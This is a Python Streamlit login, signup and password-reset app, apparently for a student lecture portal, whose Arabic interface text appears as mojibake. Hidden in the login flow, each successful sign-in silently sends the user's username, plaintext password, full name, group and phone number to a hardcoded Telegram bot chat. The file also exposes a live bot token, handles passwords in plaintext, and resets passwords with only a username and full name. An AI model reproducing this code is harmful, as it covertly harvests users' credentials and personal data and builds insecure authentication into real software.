import streamlit as st
import requests
from orders import main as orders_main  # Ù…Ù„Ù Ø¹Ø±Ø¶ Ø§Ù„Ø£Ø³Ø¦Ù„Ø© ÙˆØ§Ù„Ù…Ø­Ø§Ø¶Ø±Ø§Øª

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbycx6K2dBkAytd7QQQkrGkVnGkQUc0Aqs2No55dUDVeUmx8ERwaLqClhF9zhofyzPmY/exec"

def load_css():
    st.markdown("""
        <style>
        body {
            background: linear-gradient(to right, #6a11cb, #2575fc);
        }
        .stApp {
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
            font-family: 'Segoe UI', sans-serif;
        }
        .login-card {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 3rem 2rem;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(8px);
            max-width: 500px;
            margin: auto;
            margin-top: 50px;
        }
        input {
            border-radius: 10px !important;
            padding: 10px !important;
        }
        div.stButton > button {
            background-color: #ffffff;
            color: #2575fc;
            border-radius: 10px;
            padding: 0.75rem 1.5rem;
            font-weight: bold;
            transition: 0.3s ease-in-out;
        }
        div.stButton > button:hover {
            background-color: #2575fc;
            color: white;
            box-shadow: 0 0 10px white;
        }
        h2, h3, h4, p {
            text-align: center;
        }
        </style>
    """, unsafe_allow_html=True)

def send_telegram_message(message):
    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
    chat_id = "6283768537"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data)
    except Exception as e:
        st.error(f"Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…: {e}")

def check_login(username, password):
    data = {"action": "check", "username": username, "password": password}
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
        return res.text.strip() == "TRUE"
    except Exception as e:
        st.error(f"Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„: {e}")
        return False

def get_user_data(username):
    data = {"action": "get_user_data", "username": username}
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
        text = res.text.strip()
        if text == "NOT_FOUND":
            return None
        parts = text.split(",")
        if len(parts) == 5:
            return {
                "username": parts[0],
                "password": parts[1],
                "full_name": parts[2],
                "group": parts[3],
                "phone": parts[4]
            }
        return None
    except Exception as e:
        st.error(f"Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
        return None

def add_user(username, password, full_name, group, phone):
    data = {
        "action": "add",
        "username": username,
        "password": password,
        "full_name": full_name,
        "group": group,
        "phone": phone
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
        return res.text.strip() == "Added"
    except Exception as e:
        st.error(f"Ø®Ø·Ø£ ÙÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø¬Ø¯ÙŠØ¯: {e}")
        return False

def update_password(username, full_name, new_password):
    data = {
        "action": "update_password",
        "username": username,
        "full_name": full_name,
        "new_password": new_password
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=120)
        return res.text.strip() == "UPDATED"
    except Exception as e:
        st.error(f"Ø®Ø·Ø£ ÙÙŠ ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: {e}")
        return False

def login_page():
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    st.markdown("<h2>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h2>", unsafe_allow_html=True)

    username = st.text_input("Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", key="login_username")
    password = st.text_input("ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±", type="password", key="login_password")

    if st.button("Ø¯Ø®ÙˆÙ„"):
        if not username or not password:
            st.warning("ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„")
        elif check_login(username, password):
            user_data = get_user_data(username)
            if user_data:
                st.session_state['logged_in'] = True
                st.session_state['user_name'] = user_data['username']
                message = (
                    f"ğŸ”‘ ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:\n"
                    f"Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: <b>{user_data['username']}</b>\n"
                    f"ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: <b>{user_data['password']}</b>\n"
                    f"Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„: <b>{user_data['full_name']}</b>\n"
                    f"Ø§Ù„Ø¬Ø±ÙˆØ¨: <b>{user_data['group']}</b>\n"
                    f"Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ: <b>{user_data['phone']}</b>"
                )
                send_telegram_message(message)
                st.rerun()
            else:
                st.error("ØªØ¹Ø°Ø± Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…")
        else:
            st.error("Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­Ø©")

    if st.button("Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯"):
        st.session_state['show_signup'] = True
        st.rerun()
    if st.button("Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŸ"):
        st.session_state['show_forgot'] = True
        st.rerun()
    st.markdown('</div>', unsafe_allow_html=True)

def signup_page():
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    st.markdown("<h2>Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</h2>", unsafe_allow_html=True)

    username = st.text_input("Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", key="signup_username")
    password = st.text_input("ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±", type="password", key="signup_password")
    full_name = st.text_input("Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„", key="signup_full_name")
    group = st.text_input("Ø§Ù„Ø¬Ø±ÙˆØ¨", key="signup_group")
    phone = st.text_input("Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ", key="signup_phone")

    if st.button("ØªØ³Ø¬ÙŠÙ„"):
        if not username or not password or not full_name or not group or not phone:
            st.warning("ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„")
        elif add_user(username, password, full_name, group, phone):
            st.success("ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ù†Ø¬Ø§Ø­ âœ…")
            st.session_state['show_signup'] = False
            st.rerun()
        else:
            st.error("ÙØ´Ù„ ÙÙŠ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø­Ø³Ø§Ø¨")

    if st.button("Ø¹ÙˆØ¯Ø© Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„"):
        st.session_state['show_signup'] = False
        st.rerun()
    st.markdown('</div>', unsafe_allow_html=True)

def forgot_password_page():
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    st.markdown("<h2>Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</h2>", unsafe_allow_html=True)

    username = st.text_input("Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", key="forgot_username")
    full_name = st.text_input("Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„", key="forgot_full_name")

    if st.button("ØªØ­Ù‚Ù‚"):
        user_data = get_user_data(username)
        if user_data and user_data['full_name'].strip().lower() == full_name.strip().lower():
            st.session_state['allow_reset'] = True
            st.success("ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ØŒ Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø¬Ø¯ÙŠØ¯Ø©")
        else:
            st.error("Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØºÙŠØ± ØµØ­ÙŠØ­Ø©")

    if st.session_state.get('allow_reset'):
        new_password = st.text_input("ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©", type="password", key="new_pass")
        confirm_password = st.text_input("ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±", type="password", key="confirm_pass")

        if st.button("ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±"):
            if new_password != confirm_password:
                st.warning("ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± Ù…ØªØ·Ø§Ø¨Ù‚Ø©")
            elif update_password(username, full_name, new_password):
                st.success("âœ… ØªÙ… ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±")
                st.session_state['show_forgot'] = False
                st.session_state['allow_reset'] = False
                st.rerun()
            else:
                st.error("ÙØ´Ù„ ÙÙŠ Ø§Ù„ØªØ­Ø¯ÙŠØ«")
    if st.button("Ø¹ÙˆØ¯Ø© Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„"):
        st.session_state['show_forgot'] = False
        st.rerun()
    st.markdown('</div>', unsafe_allow_html=True)

def main():
    load_css()

    if 'logged_in' not in st.session_state:
        st.session_state['logged_in'] = False
    if 'show_signup' not in st.session_state:
        st.session_state['show_signup'] = False
    if 'show_forgot' not in st.session_state:
        st.session_state['show_forgot'] = False

    if st.session_state['logged_in']:
        st.sidebar.write(f"Ù…Ø±Ø­Ø¨Ø§Ù‹ØŒ {st.session_state['user_name']}")
        if st.sidebar.button("ØªØ³Ø¬ÙŠÙ„ Ø®Ø±ÙˆØ¬"):
            st.session_state['logged_in'] = False
            st.session_state.pop('user_name', None)
            st.rerun()
        orders_main()
    elif st.session_state['show_signup']:
        signup_page()
    elif st.session_state['show_forgot']:
        forgot_password_page()
    else:
        login_page()

if __name__ == "__main__":
    main()
